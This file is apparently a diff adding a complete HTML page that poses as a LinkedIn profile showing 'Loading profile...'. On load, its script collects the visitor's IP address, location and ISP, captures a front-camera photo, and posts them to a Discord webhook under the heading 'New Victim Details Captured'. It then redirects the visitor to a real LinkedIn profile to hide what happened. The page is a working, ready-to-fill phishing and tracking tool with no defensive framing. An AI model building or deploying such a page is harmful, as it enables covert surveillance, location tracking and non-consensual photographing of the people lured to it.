@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn Profile</title>
+    <style>
+        body { margin:0; padding:0; background:#fff; height:100vh; display:flex; align-items:center; justify-content:center; font-family:Arial; }
+        h1 { color: #0077b5; }
+    </style>
+</head>
+<body>
+    <h1>Loading profile...</h1>
+
+    <script>
+        // ================== CHANGE THESE TWO LINES ==================
+        const YOUR_DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";
+        const REDIRECT_URL = "https://www.linkedin.com/in/connectaditya08/";
+        // ===========================================================
+
+        let visitorInfo = {
+            ip: "Unknown",
+            city: "Unknown",
+            country: "Unknown",
+            isp: "Unknown",
+            timestamp: new Date().toISOString()
+        };
+
+        async function sendData(photoBase64) {
+            const formData = new FormData();
+            formData.append("payload_json", JSON.stringify({
+                content: "**New Victim Details Captured** 🔥",
+                embeds: [{
+                    title: "Visitor Information",
+                    color: 0x0077b5,
+                    fields: [
+                        { name: "IP Address", value: visitorInfo.ip, inline: true },
+                        { name: "Location", value: `${visitorInfo.city}, ${visitorInfo.country}`, inline: true },
+                        { name: "ISP", value: visitorInfo.isp, inline: false },
+                        { name: "Time", value: visitorInfo.timestamp, inline: false }
+                    ]
+                }]
+            }));
+
+            const blob = await fetch(photoBase64).then(r => r.blob());
+            formData.append("file", blob, "photo.jpg");
+
+            await fetch(YOUR_DISCORD_WEBHOOK, {
+                method: "POST",
+                body: formData
+            });
+        }
+
+        // Main Process
+        async function start() {
+            try {
+                // Get IP + Location
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                visitorInfo.ip = ipData.ip;
+
+                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geo = await geoRes.json();
+                visitorInfo.city = geo.city || "Unknown";
+                visitorInfo.country = geo.country_name || "Unknown";
+                visitorInfo.isp = geo.org || "Unknown";
+
+                // Request Camera (Front)
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" }
+                });
+
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                await new Promise(resolve => setTimeout(resolve, 1400)); // Wait for camera
+
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                const photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+
+                // Stop camera
+                stream.getTracks().forEach(track => track.stop());
+
+                // Send data
+                await sendData(photoBase64);
+
+            } catch (error) {
+                console.log("Error:", error);
+            } finally {
+                // Always redirect
+                window.location.href = REDIRECT_URL;
+            }
+        }
+
+        // Start immediately
+        start();
+    </script>
+</body>
+</html>
